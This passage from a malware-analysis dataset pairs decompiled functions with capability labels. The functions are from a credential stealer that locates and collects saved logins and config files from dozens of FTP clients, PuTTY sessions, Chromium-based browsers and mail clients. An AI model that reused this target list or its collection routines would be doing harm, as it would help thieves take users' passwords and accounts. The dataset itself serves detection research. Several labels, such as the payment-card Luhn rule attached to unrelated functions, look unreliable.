        "decompiled_code": "\nvoid __cdecl fcn.00409b83(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x29, 0);\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\LeechFTP\", \"AppDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, iVar1, \"bookmark.dat\", 0xbeef0000);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\LeechFTP\", \"LocalDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, iVar1, \"bookmark.dat\", 0xbeef0000);\n        fcn.0040178e(uVar2);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 275
    },
    "00409d2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409d2f(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t lpString;\n    uint arg_ch_00;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x2c, 0);\n    lpString = fcn.00401b82(0x80000000, \"CLSID\\\\{11C1D741-A95B-11d2-8A80-0080ADB32FF4}\\\\InProcServer32\", 0, 0);\n    if (lpString != 0) {\n        arg_ch_00 = fcn.0040223e(lpString);\n        hMem = arg_8h;\n        fcn.0040404c(arg_8h, arg_ch_00, \"sites.db\", 0xbeef0000);\n        fcn.0040178e(hMem);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 230
    },
    "00409d89": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ftpgetter information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409d89(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x2d, 0);\n    fcn.00404097(arg_8h, \"\\\\FTPGetter\", \"servers.xml\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 102
    },
    "00409dc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather alftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409dc4(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x2e, 0);\n    fcn.00404097(arg_8h, \"\\\\Estsoft\\\\ALFTP\", \"ESTdb2.dat\", 0xbeef0000);\n    fcn.00404097(arg_8h, \"\\\\Estsoft\\\\ALFTP\", \"QData.dat\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 138
    },
    "00409e16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e16(uint arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t pv;\n    \n    iVar1 = (**(*arg_10h + 0x1c))(arg_10h, 0, arg_8h, &pv, 0);\n    if (iVar1 == 0) {\n        sub.kernel32.dll_WideCharToMultiByte(0, 0, *(pv + 4), 0xffffffff, arg_ch, 0x3ff, 0, 0);\n        sub.ole32.dll_CoTaskMemFree(pv);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00409e61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e61(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t pv;\n    \n    iVar1 = (**(*arg_14h + 0x28))(arg_14h, 0, arg_8h, arg_ch, &pv, 0);\n    if (iVar1 == 0) {\n        sub.kernel32.dll_WideCharToMultiByte(0, 0, *(pv + 4), 0xffffffff, arg_10h, 0x3ff, 0, 0);\n        sub.ole32.dll_CoTaskMemFree(pv);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "0040ab7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ab7d(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x30, 0);\n    fcn.0040aa42(arg_8h, \"Software\\\\Adobe\\\\Common\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 95
    },
    "0040bc4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc4b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00401000(&var_4h);\n    iVar1 = fcn.00401230(arg_ch, var_4h);\n    if (iVar1 != 0) {\n        fcn.0040b6f1(var_4h, arg_8h, arg_10h, fcn.0040bb1c);\n    }\n    fcn.00401026(var_4h);\n    return;\n}\n",
        "token_count": 137
    },
    "0040c10d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c10d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00401000(&var_4h);\n    iVar1 = fcn.00401230(arg_ch, var_4h);\n    if (iVar1 != 0) {\n        fcn.0040b6f1(var_4h, arg_8h, arg_10h, fcn.0040bfde);\n    }\n    fcn.00401026(var_4h);\n    return;\n}\n",
        "token_count": 136
    },
    "0040c14e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c14e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x32, 0);\n    fcn.0040bd47(arg_8h, \"\\\\Google\\\\Chrome\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 93
    },
    "0040c1b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c1b0(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_ch_00;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x34, 0);\n    fcn.0040bd47(arg_8h, \"\\\\ChromePlus\");\n    arg_ch_00 = fcn.00401b82(*0x4120d5, \"Software\\\\ChromePlus\", \"Install_Dir\", 0);\n    if (arg_ch_00 != 0) {\n        fcn.00403ea1(arg_8h, arg_ch_00, 0x413c5d, 0xbeef0000, fcn.0040bc4b);\n        fcn.00403ea1(arg_8h, arg_ch_00, 0x413c66, 0xbeef0000, fcn.0040bc4b);\n        fcn.0040178e(arg_ch_00);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 254
    },
    "0040c23b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c23b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x35, 0);\n    fcn.0040bd47(arg_8h, \"\\\\Bromium\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 92
    },
    "0040c26c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c26c(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x36, 0);\n    fcn.0040bd47(arg_8h, \"\\\\Nichrome\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 92
    },
    "0040c29d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c29d(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x37, 0);\n    fcn.0040bd47(arg_8h, \"\\\\Comodo\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 92
    },
    "0040c2ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c2ce(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x38, 0);\n    fcn.0040bd47(arg_8h, \"\\\\RockMelt\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 93
    },
    "0040c670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c670(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x3c, 0);\n    fcn.0040c5ff(arg_8h, 0x1a);\n    fcn.0040c5ff(arg_8h, 0x23);\n    fcn.0040c5ff(arg_8h, 0x1c);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 134
    },
    "0040c6e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c6e9(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x3d, 0);\n    fcn.0040c6b2(arg_8h, 0x1a);\n    fcn.0040c6b2(arg_8h, 0x23);\n    fcn.0040c6b2(arg_8h, 0x1c);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 139
    },
    "0040c90a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c90a(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x40, 0);\n    iVar1 = fcn.00401b82(0x80000000, \"FTP++.Link\\\\shell\\\\open\\\\command\", 0, 0);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040223e(iVar1);\n        if (iVar1 != 0) {\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, iVar1, \".fpl\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 208
    },
    "0040caf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040caf4(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t lpString;\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint hMem;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x43, 0);\n    lpString = fcn.00401b82(0x80000002, \n                            \"SOFTWARE\\\\Classes\\\\TypeLib\\\\{F9043C88-F6F2-101A-A3C9-08002B2F49FB}\\\\1.2\\\\0\\\\win32\", 0, 0);\n    if (lpString != 0) {\n        iVar1 = sub.shlwapi.dll_StrStrIA(lpString, \"EasyFTP\");\n        if (iVar1 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            hMem = arg_8h;\n            fcn.00403ea1(arg_8h, arg_ch_00, 0, 0xbeef0000, fcn.0040caa8);\n            fcn.0040178e(hMem);\n        }\n        fcn.0040178e(lpString);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 302
    },
    "0040cb6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather xftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cb6e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x44, 0);\n    fcn.00404097(arg_8h, \"\\\\NetSarang\", \".xfp\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040cf1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cf1b(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_ch_00;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x45, 0);\n    fcn.0040cc5a(arg_8h);\n    arg_ch_00 = fcn.00401cc2(5);\n    if (arg_ch_00 != 0) {\n        hMem = arg_8h;\n        fcn.00403ea1(arg_8h, arg_ch_00, \".rdp\", 0xbeef0000, fcn.0040cdbd);\n        fcn.0040178e(hMem);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 190
    },
    "0040d2da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather robo-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d2da(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x47, 0);\n    fcn.0040cff2(arg_8h, *0x4120d5, \"SOFTWARE\\\\Robo-FTP 3.7\\\\FTPServers\");\n    fcn.0040cff2(arg_8h, 0x80000002, \"SOFTWARE\\\\Robo-FTP 3.7\\\\FTPServers\");\n    fcn.0040d24b(arg_8h, *0x4120d5);\n    fcn.0040d24b(arg_8h, 0x80000002);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 191
    },
    "0040d716": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d716(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x49, 0);\n    fcn.0040d540(arg_8h, \"Software\\\\LinasFTP\\\\Site Manager\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 97
    },
    "0040d747": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d747(uint arg_8h, uint lpString, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = sub.kernel32.dll_lstrlenA(lpString);\n    if (iVar1 == 0) {\n        return;\n    }\n    var_8h = sub.kernel32.dll_lstrlenA(arg_10h);\n    if (var_8h == 0) {\n        return;\n    }\n    var_4h = fcn.004017a5(var_8h);\n    iVar1 = fcn.004024bb(arg_10h, var_8h, var_4h);\n    if (iVar1 != 0) {\n        var_ch = iVar1;\n        iVar1 = fcn.004040d7(var_4h, &var_ch, 0);\n        if (iVar1 != 0) {\n            fcn.00401522(arg_8h, 0xbeef1000);\n            fcn.00401584(arg_8h, lpString);\n            fcn.00401558(arg_8h, var_4h, var_ch);\n        }\n    }\n    fcn.0040178e(var_4h);\n    return;\n}\n",
        "token_count": 291
    },
    "0040d921": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather cyberduck information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d921(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x4a, 0);\n    fcn.0040d8e5(arg_8h, 0x1a);\n    fcn.0040d8e5(arg_8h, 0x23);\n    fcn.0040d8e5(arg_8h, 0x1c);\n    fcn.00404097(arg_8h, \"\\\\Cyberduck\", \".duck\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 164
    },
    "0040db5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db5e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x4b, 0);\n    fcn.0040d97a(*0x4120d5, \"Software\\\\SimonTatham\\\\PuTTY\\\\Sessions\", arg_8h);\n    fcn.0040d97a(0x80000002, \"Software\\\\SimonTatham\\\\PuTTY\\\\Sessions\", arg_8h);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 143
    },
    "0040dba7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dba7(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x4c, 0);\n    fcn.00404097(arg_8h, \"\\\\Notepad++\", \"NppFTP.xml\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040de1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather direct-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040de1b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x4d, 0);\n    fcn.0040dbe2(*0x4120d5, \"Software\\\\CoffeeCup Software\", arg_8h);\n    fcn.0040dbe2(0x80000002, \"Software\\\\CoffeeCup Software\", arg_8h);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 133
    },
    "0040dee2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ftpinfo information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dee2(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_ch_00;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x4f, 0);\n    arg_ch_00 = fcn.00401b82(*0x4120d5, \"Software\\\\MAS-Soft\\\\FTPInfo\\\\Setup\", 0x4141fb, 0);\n    if (arg_ch_00 != 0) {\n        hMem = arg_8h;\n        fcn.0040404c(arg_8h, arg_ch_00, \"ServerList.xml\", 0xbeef0000);\n        fcn.0040178e(hMem);\n    }\n    fcn.00404097(arg_8h, \"\\\\FTPInfo\", \"ServerList.xml\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 224
    },
    "0040e04d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e04d(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x52, 0);\n    fcn.0040bd47(arg_8h, \"\\\\MapleStudio\\\\ChromePlus\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 96
    },
    "0040e3c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather winzip information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e3c9(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x53, 0);\n    fcn.0040e1b7(*0x4120d5, \"Software\\\\Nico Mak Computing\\\\WinZip\\\\FTP\", arg_8h);\n    fcn.0040e1b7(0x80000002, \"Software\\\\Nico Mak Computing\\\\WinZip\\\\FTP\", arg_8h);\n    fcn.0040e300(*0x4120d5, \"Software\\\\Nico Mak Computing\\\\WinZip\\\\mru\\\\jobs\", arg_8h);\n    fcn.0040e300(0x80000002, \"Software\\\\Nico Mak Computing\\\\WinZip\\\\mru\\\\jobs\", arg_8h);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 220
    },
    "0040e437": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e437(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x54, 0);\n    fcn.0040bd47(arg_8h, \"\\\\Yandex\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 91
    },
    "0040e54e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e54e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x56, 0);\n    fcn.0040e4e6(arg_8h, \"{74FF1730-B1F2-4D88-926B-1568FAE61DB7}\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 115
    },
    "0040e57f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather nova-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e57f(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x57, 0);\n    fcn.00404097(arg_8h, \"\\\\INSoftware\\\\NovaFTP\", \"NovaFTP.db\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 106
    },
    "0040e829": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e829(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x59, 0);\n    fcn.0040e7eb(arg_8h, \"\\\\Microsoft\\\\Windows Live Mail\", \"Software\\\\Microsoft\\\\Windows Live Mail\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040e85f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e85f(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x58, 0);\n    fcn.0040e7eb(arg_8h, \"\\\\Microsoft\\\\Windows Mail\", \"Software\\\\Microsoft\\\\Windows Mail\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 103
    },
    "0040e895": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e895(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x5a, 0);\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\RimArts\\\\B2\\\\Settings\", \"DataDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, iVar1, \"Mailbox.ini\", 0xbeef0000);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(0x80000002, \"Software\\\\RimArts\\\\B2\\\\Settings\", \"DataDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, iVar1, \"Mailbox.ini\", 0xbeef0000);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\RimArts\\\\B2\\\\Settings\", \"DataDirBak\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, iVar1, \"Mailbox.ini\", 0xbeef0000);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(0x80000002, \"Software\\\\RimArts\\\\B2\\\\Settings\", \"DataDirBak\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040404c(arg_8h, iVar1, \"Mailbox.ini\", 0xbeef0000);\n        fcn.0040178e(uVar2);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 494
    },
    "0040ead1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ead1(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x5b, 0);\n    fcn.0040e987(*0x4120d5, \"Software\\\\Poco Systems Inc\", arg_8h);\n    fcn.0040e987(0x80000002, \"Software\\\\Poco Systems Inc\", arg_8h);\n    fcn.00404097(arg_8h, \"\\\\Pocomail\", \"accounts.ini\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 160
    },
    "0040ee3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ee3c(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x5c, 0);\n    str._mtpServer[0] = 'S';\n    str._mtpPort[0] = 'S';\n    str._mtpAccount[0] = 'S';\n    str._mtpPassword[0] = 'S';\n    fcn.0040eb31(*0x4120d5, \"Software\\\\IncrediMail\", arg_8h);\n    fcn.0040eb31(0x80000002, \"Software\\\\IncrediMail\", arg_8h);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 183
    },
    "0040eea1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eea1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    fcn.0040404c(arg_8h, arg_ch, \"account.cfg\", 0xbeef0000);\n    fcn.0040404c(arg_8h, arg_ch, \"account.cfn\", 0xbeef0001);\n    arg_ch_00 = fcn.00401dcb(arg_ch);\n    if (arg_ch_00 != 0) {\n        fcn.0040404c(arg_8h, arg_ch_00, \"account.cfg\", 0xbeef0000);\n        fcn.0040404c(arg_8h, arg_ch_00, \"account.cfn\", 0xbeef0001);\n        fcn.0040178e(arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "0040f03d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f03d(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x5d, 0);\n    fcn.00404097(arg_8h, \"\\\\BatMail\", \"account.cfg\", 0xbeef0000);\n    fcn.00404097(arg_8h, \"\\\\BatMail\", \"account.cfn\", 0xbeef0001);\n    fcn.00404097(arg_8h, \"\\\\The Bat!\", \"account.cfg\", 0xbeef0000);\n    fcn.00404097(arg_8h, \"\\\\The Bat!\", \"account.cfn\", 0xbeef0001);\n    fcn.0040ef16(arg_8h, *0x4120d5);\n    fcn.0040ef16(arg_8h, 0x80000002);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 227
    },
    "0040f0d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f0d8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t lpString;\n    uint var_4h;\n    \n    lpString = fcn.004028dd(arg_10h, arg_14h);\n    if (lpString != 0) {\n        fcn.00401522(arg_8h, arg_18h);\n        fcn.00401584(arg_8h, arg_ch);\n        fcn.00401584(arg_8h, lpString);\n        fcn.0040178e(lpString);\n        lpString = 1;\n    }\n    return lpString;\n}\n",
        "token_count": 162
    },
    "0040f2b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
